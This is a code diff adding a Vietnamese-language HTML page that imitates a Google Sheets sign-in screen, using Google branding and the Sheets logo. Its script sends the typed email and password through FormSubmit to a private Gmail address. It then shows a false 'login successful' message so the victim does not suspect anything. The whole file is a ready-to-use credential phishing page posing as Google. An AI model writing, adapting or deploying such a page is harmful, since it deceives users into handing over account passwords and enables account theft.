@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập Google Sheets</title>
+    <style>
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 400px;
+            text-align: center;
+        }
+        .logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-weight: normal;
+            color: #202124;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border: 2px solid #1a73e8;
+            outline: none;
+            padding: 14px;
+        }
+        button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            float: right;
+        }
+        button:hover {
+            background-color: #1765cc;
+        }
+        .footer {
+            clear: both;
+            padding-top: 40px;
+            color: #5f6368;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.gstatic.com/images/branding/product/1x/sheets_2020q4_48dp.png" alt="Google Sheets" class="logo">
+        <h1>Đăng nhập</h1>
+        <p class="subtitle">Tiếp tục với Google Sheets</p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" placeholder="Email hoặc số điện thoại" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Nhập mật khẩu" required>
+            </div>
+            <button type="submit">Tiếp theo</button>
+        </form>
+        
+        <div class="footer">
+            Google Sheets giúp bạn tạo và chỉnh sửa bảng tính trực tuyến
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Gửi dữ liệu đến FormSubmit
+            fetch('https://formsubmit.co/ajax/minhquan0619@gmail.com', {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    _subject: "Thông tin đăng nhập mới",
+                    _template: "table"
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("Đăng nhập thành công! Vui lòng kiểm tra email để xác nhận.");
+                document.getElementById('loginForm').reset();
+            })
+            .catch(error => {
+                alert("Có lỗi xảy ra, vui lòng thử lại!");
+            });
+        });
+    </script>
+</body>
+</html>
